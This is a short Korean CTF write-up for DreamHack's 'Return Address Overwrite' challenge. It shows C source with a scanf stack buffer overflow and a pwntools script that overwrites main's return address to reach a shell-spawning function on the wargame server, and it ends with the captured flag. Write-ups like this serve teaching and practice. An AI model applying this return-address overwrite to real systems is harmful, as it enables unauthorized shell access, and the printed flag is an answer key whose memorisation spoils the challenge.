# [DreamHack] Return Address Overwrite

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Return Address Overwrite에서 실습하는 문제입니다.
>
> Release: [Return Address Overwrite.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8537824/Return.Address.Overwrite.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159480790-43a7b771-fede-4355-ba6b-967e57e38258.png)

## Analysis

```c
void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

`scanf("%s", buf)`에서 BOF가 발생한다. `main()`의 return address를 `get_shell()`로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rao')
else:
    r = remote('host2.dreamhack.games', 24292)

get_shell = 0x4006aa # get_shell()

r.sendlineafter('Input: ', b'a' * 0x38 + p64(get_shell))

r.interactive()
```

```
[+] Opening connection to host2.dreamhack.games on port 24292: Done
[*] Switching to interactive mode
$ cat flag
DH{5f47cd0e441bdc6ce8bf6b8a3a0608dc}
```